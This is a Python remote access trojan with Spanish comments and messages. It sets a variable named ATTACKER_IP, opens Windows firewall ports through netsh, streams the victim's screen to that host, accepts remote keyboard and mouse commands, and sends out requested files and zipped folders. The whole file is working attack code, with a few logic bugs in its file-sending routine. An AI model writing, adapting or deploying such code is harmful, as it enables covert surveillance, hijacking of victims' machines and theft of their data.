import socket
import pyautogui
import cv2
import numpy as np
import threading
import os
import keyboard
import zipfile
import subprocess

#Config

ATTACKER_IP = "Ip publica"
PORT_VIDEO = 9998
PORT_INPUT = 9999
PORT_FILE = 9997

def open_firewall_ports():
    
    ports = [PORT_VIDEO, PORT_INPUT, PORT_FILE]
    try:
        for port in ports:
            subprocess.run(
                f'netsh advfirewall firewall add rule name="DEMO PORT {port}" '
                f'dir=in action=allow protocol=TCP localport={port}',
                shell=True,
                check=True
            )
            print("Puertos del Firewall Abiertos.")
    except subprocess.CalledProcessError:
        print("Error: Se requieren privilegios de Admin")
        

def send_screen():
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(( ATTACKER_IP, PORT_VIDEO ))
    
    while True:
        
        screenshot = pyautogui.screenshot()
        frame = np.array(screenshot)
        frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
        
        _, buffer = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 30])
        frame_data = buffer.tobytes()
        
        sock.send(len(frame_data).to_bytes(4, byteorder="big"))
        sock.send(frame_data)
    
    sock.close()
    
def receive_input_events():
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(( "0.0.0.0", PORT_INPUT ))
    sock.listen(1)
    conn, _ = sock.accept()
    
    while True:
        data = conn.recv(1024).decode()
        if not data:
            break
        
        if data.startswith("keydown:"):
            key = int(data.split(":")[1])
            pyautogui.keyDown(key)
            
        elif data.startswith("keyup:"):
            key = int(data.split(":")[1])
            pyautogui.keyUp(key)

        elif data.startswith("mouse_move:"):
            x, y = map(int, data.split(":")[1:])
            pyautogui.moveTo(x, y)
            
        elif data.startswith("mouse_click:"):
            button = int(data.split(":")[1])
            pyautogui.click(button=button)
            
        elif data.startswith("download:"):
            file_path = data.split(":")[1]
            send_file(file_path)
            
    conn.close()
    
def compress_folder(folder_path):
    
    zip_path = f"{folder_path}.zip"
    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(folder_path):
            for file in files:
                file_path = os.path.join(root, file)
                arcname = os.path.relpath(file_path, folder_path)
                zipf.write(file_path, arcname)
                
    return zip_path

def send_file(file_path):
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(( "0.0.0.0", PORT_FILE ))
    sock.listen(1)
    conn, _ = sock.accept()
    
    if os.path.isdir(file_path):
        file_path = compress_folder(file_path)
        
        with open(file_path, "rb") as f:
            while True: 
                
                data = f.read(1024)
                if not data:
                    break 
                conn.send(data)
                
        conn.close()
        if os.path.isdir(file_path):
            os.remove(file_path)
            

def check_exit_combination():
    
    while True:
        if keyboard.is_pressed("shift+ctrl+m"):
            print('Cerrando Sesion')
            os._exit(0)
            

if __name__ == "__main__":
    open_firewall_ports()
    
    video_thread = threading.Thread(target=send_screen)
    input_thread = threading.Thread(target=receive_input_events)
    exit_thread = threading.Thread(target=check_exit_combination)
    
    video_thread.start()
    input_thread.start()
    exit_thread.start()